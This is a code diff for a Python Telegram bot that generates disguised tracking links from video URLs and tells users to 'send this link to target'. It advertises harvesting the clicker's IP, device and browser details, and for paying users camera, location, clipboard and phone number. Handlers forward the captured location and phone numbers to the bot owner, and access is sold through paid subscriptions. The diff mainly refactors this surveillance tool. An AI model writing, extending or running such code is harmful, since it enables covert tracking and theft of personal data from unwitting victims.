 
-@bot.message_handler(func=lambda m: m.text == "💰 ETH Price")
-def eth_button(message):
-    eth_price(message)
+# ==================== NEWS ====================
+@bot.message_handler(commands=['news'])
+def news_command(message):
+    news = get_crypto_news()
+    msg = "📰 *Top Crypto News*\n━━━━━━━━━━━━━━━━━━━━━\n"
+    for i, n in enumerate(news, 1):
+        msg += f"{i}. {n}\n"
+    msg += "━━━━━━━━━━━━━━━━━━━━━"
+    bot.reply_to(message, msg, parse_mode="Markdown")
 
-@bot.message_handler(func=lambda m: m.text == "💰 DOGE Price")
-def doge_button(message):
-    doge_price(message)
-
-# ==================== GENERATE LINK (IMPROVED DESIGN & ANIMATION) ====================
-@bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
+# ==================== HACK LINK COMMANDS (existing) ====================
+@bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK" or (hasattr(m, 'callback') and m.callback and m.callback.data == "gen_link"))
 def gen_link(message):
-    premium = is_premium(message.from_user.id)
-    
+    # If called from callback, message is the call.message, we need to adapt
+    if hasattr(message, 'callback'):
+        msg = message.call.message
+    else:
+        msg = message
+    premium = is_premium(msg.from_user.id)
     if premium:
         badge = "⭐ PREMIUM USER ⭐"
         features = "📸 Camera | 📍 Location | 📋 Clipboard | 📱 Phone"
     else:
         badge = "🆓 FREE USER 🆓"
         features = "🌐 IP | 📱 Device | 🖥️ Browser | 📺 Screen"
-    
     markup = types.InlineKeyboardMarkup()
     btn = types.InlineKeyboardButton("🎯 ENTER VIDEO LINK", callback_data="enter_link")
     markup.add(btn)
-    
     design_msg = f"""
 ╔══════════════════════╗
 ║   🔗 *LINK GENERATOR*   ║
@@ -456,8 +707,7 @@ def gen_link(message):
 *and paste your video link*
 ━━━━━━━━━━━━━━━━━━━━━
     """
-    
-    bot.send_message(message.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)
+    bot.send_message(msg.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "enter_link")
 def ask_link(call):
@@ -472,12 +722,9 @@ def ask_link(call):
 def process_link(message):
     url = message.text.strip()
     if not (url.startswith('http://') or url.startswith('https://')):
-        bot.reply_to(message, "❌ *Invalid Link!*\nMust start with http:// or https://", parse_mode="Markdown")
+        bot.reply_to(message, t("❌ *Invalid Link!*\nMust start with http:// or https://", message.from_user.id), parse_mode="Markdown")
         return
-    
-    # Beautiful loading animation
     loading = bot.reply_to(message, "⏳ *Generating your secure link...*", parse_mode="Markdown")
-    
     frames = [
         "🔴 *0%* [          ]",
         "🟠 *20%* [█         ]",
@@ -487,31 +734,25 @@ def process_link(message):
         "💜 *99%* [█████     ]",
         "✨ *100%* [██████    ]"
     ]
-    
     for frame in frames:
         time.sleep(0.4)
         try:
             bot.edit_message_text(frame, loading.chat.id, loading.message_id, parse_mode="Markdown")
         except:
             pass
-    
     link_id = str(uuid.uuid4())[:8]
     modified_url = f"{BASE_URL}/click/{link_id}"
-    
     conn = get_db()
     c = conn.cursor()
     c.execute("INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
               (link_id, message.from_user.id, url, modified_url, datetime.datetime.now()))
     conn.commit()
     conn.close()
-    
-    # Beautiful success message with extra buttons
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{link_id}")
     btn2 = types.InlineKeyboardButton("🔍 PREVIEW", url=modified_url)
     btn3 = types.InlineKeyboardButton("📤 SHARE", switch_inline_query=modified_url)
     markup.add(btn1, btn2, btn3)
-    
     success_msg = f"""
 ╔══════════════════════╗
 ║  ✅ *LINK GENERATED*   ║
@@ -531,7 +772,6 @@ def process_link(message):
 
 👇 *Send this link to target*
     """
-    
     bot.edit_message_text(success_msg, loading.chat.id, loading.message_id, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
@@ -542,38 +782,40 @@ def copy_link(call):
     c.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,))
     row = c.fetchone()
     conn.close()
-    
     if row:
         bot.answer_callback_query(call.id, "✅ Link copied to clipboard!")
-        bot.send_message(
-            call.message.chat.id,
-            f"📋 *Your Link:*\n`{row[0]}`",
-            parse_mode="Markdown"
-        )
+        bot.send_message(call.message.chat.id, f"📋 *Your Link:*\n`{row[0]}`", parse_mode="Markdown")
     else:
         bot.answer_callback_query(call.id, "❌ Link not found")
 
-# ==================== BALANCE ====================
-@bot.message_handler(func=lambda m: m.text == "💰 BALANCE")
+# ==================== BALANCE, INFO, SUBSCRIPTION, HISTORY (simplified) ====================
+@bot.message_handler(func=lambda m: m.text == "💰 BALANCE" or (hasattr(m, 'callback') and m.callback and m.callback.data == "balance"))
 def balance_cmd(message):
-    if message.from_user.id == OWNER_ID:
-        bot.send_message(message.chat.id, "👑 *OWNER*\n✨ Permanent Premium", parse_mode="Markdown")
+    if hasattr(message, 'callback'):
+        msg = message.call.message
+    else:
+        msg = message
+    if msg.from_user.id == OWNER_ID:
+        bot.send_message(msg.chat.id, "👑 *OWNER*\n✨ Permanent Premium", parse_mode="Markdown")
         return
-    premium = is_premium(message.from_user.id)
+    premium = is_premium(msg.from_user.id)
     if premium:
         conn = get_db()
         c = conn.cursor()
-        c.execute("SELECT subscription_end FROM users WHERE user_id=?", (message.from_user.id,))
+        c.execute("SELECT subscription_end FROM users WHERE user_id=?", (msg.from_user.id,))
         row = c.fetchone()
         conn.close()
         end = row[0][:10] if row and row[0] else "Unknown"
-        bot.send_message(message.chat.id, f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)", parse_mode="Markdown")
+        bot.send_message(msg.chat.id, f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)", parse_mode="Markdown")
     else:
-        bot.send_message(message.chat.id, "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription", parse_mode="Markdown")
+        bot.send_message(msg.chat.id, "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription", parse_mode="Markdown")
 
-# ==================== BOT INFO ====================
-@bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or m.text == "/bot_info")
+@bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or (hasattr(m, 'callback') and m.callback and m.callback.data == "bot_info"))
 def info_cmd(message):
+    if hasattr(message, 'callback'):
+        msg = message.call.message
+    else:
+        msg = message
     info_text = """
 🤖 *BOT INFORMATION*
 
@@ -607,19 +849,22 @@ def info_cmd(message):
 • 4 Stars – 15 Days
 • 1 Star – 1 Day
 """
-    bot.send_message(message.chat.id, info_text, parse_mode="Markdown")
+    bot.send_message(msg.chat.id, info_text, parse_mode="Markdown")
 
-# ==================== SUBSCRIPTION ====================
 @bot.message_handler(commands=['subscription'])
-@bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION")
+@bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION" or (hasattr(m, 'callback') and m.callback and m.callback.data == "subscription"))
 def subscription_cmd(message):
+    if hasattr(message, 'callback'):
+        msg = message.call.message
+    else:
+        msg = message
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("⭐ 7 Stars – 30 Days", callback_data="pay_30"),
         types.InlineKeyboardButton("⭐ 4 Stars – 15 Days", callback_data="pay_15"),
         types.InlineKeyboardButton("⭐ 1 Star – 1 Day", callback_data="pay_1")
     )
-    bot.send_message(message.chat.id, "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:", parse_mode="Markdown", reply_markup=markup)
+    bot.send_message(msg.chat.id, "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:", parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
 def pay_callback(call):
@@ -656,25 +901,28 @@ def payment_success(message):
     bot.send_message(OWNER_ID, f"💰 New premium: {message.from_user.id}\nStars: {stars}\nDays: {days}")
     bot.send_message(message.chat.id, f"✅ Premium activated for {days} days! Thank you.", parse_mode="Markdown")
 
-# ==================== LOG HISTORY ====================
-@bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history")
+@bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history" or (hasattr(m, 'callback') and m.callback and m.callback.data == "log_history"))
 def history_cmd(message):
+    if hasattr(message, 'callback'):
+        msg = message.call.message
+    else:
+        msg = message
     conn = get_db()
     c = conn.cursor()
     c.execute('''SELECT l.link_id, l.original_url, l.created_at, COUNT(c.id) as clicks
                  FROM links l LEFT JOIN clicks c ON l.link_id = c.link_id
                  WHERE l.user_id = ? GROUP BY l.link_id ORDER BY l.created_at DESC LIMIT 5''',
-              (message.from_user.id,))
+              (msg.from_user.id,))
     rows = c.fetchall()
     conn.close()
     if not rows:
-        bot.send_message(message.chat.id, "📭 No history found.")
+        bot.send_message(msg.chat.id, "📭 No history found.")
         return
     text = "📊 *YOUR RECENT LINKS*\n\n"
     for r in rows:
         short_url = r[1][:40] + "..." if len(r[1]) > 40 else r[1]
         text += f"🔗 `{r[0]}`\n📝 {short_url}\n👥 {r[3]} clicks\n📅 {r[2][:10]}\n\n"
-    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+    bot.send_message(msg.chat.id, text, parse_mode="Markdown")
 
 # ==================== PERMISSION HANDLERS ====================
 @bot.message_handler(content_types=['location'])
@@ -690,7 +938,7 @@ def handle_location(message):
     conn.commit()
     conn.close()
     bot.send_message(OWNER_ID, f"📍 Location from {message.from_user.id}: {lat},{lon}")
-    bot.reply_to(message, "✅ Location received! Thank you.")
+    bot.reply_to(message, t("✅ Location received! Thank you.", message.from_user.id))
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
@@ -704,7 +952,7 @@ def handle_contact(message):
     conn.commit()
     conn.close()
     bot.send_message(OWNER_ID, f"📞 Phone from {message.from_user.id}: {phone}")
-    bot.reply_to(message, "✅ Phone number received! Thank you.")
+    bot.reply_to(message, t("✅ Phone number received! Thank you.", message.from_user.id))
 
 # ==================== TRACKING HTML ====================
 TRACKING_HTML = '''
@@ -862,9 +1110,7 @@ def webhook():
 def run_bot():
     init_db()
     print("🤖 Bot starting with webhook...")
-    # Remove any existing webhook
     bot.remove_webhook()
-    # Set webhook
     webhook_url = f"{BASE_URL}/webhook"
     result = bot.set_webhook(url=webhook_url)
     if result:
@@ -873,8 +1119,6 @@ def run_bot():
         print("❌ Webhook failed to set")
 
 if __name__ == "__main__":
-    # Run bot setup in a thread
     threading.Thread(target=run_bot, daemon=True).start()
-    # Start Flask server
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
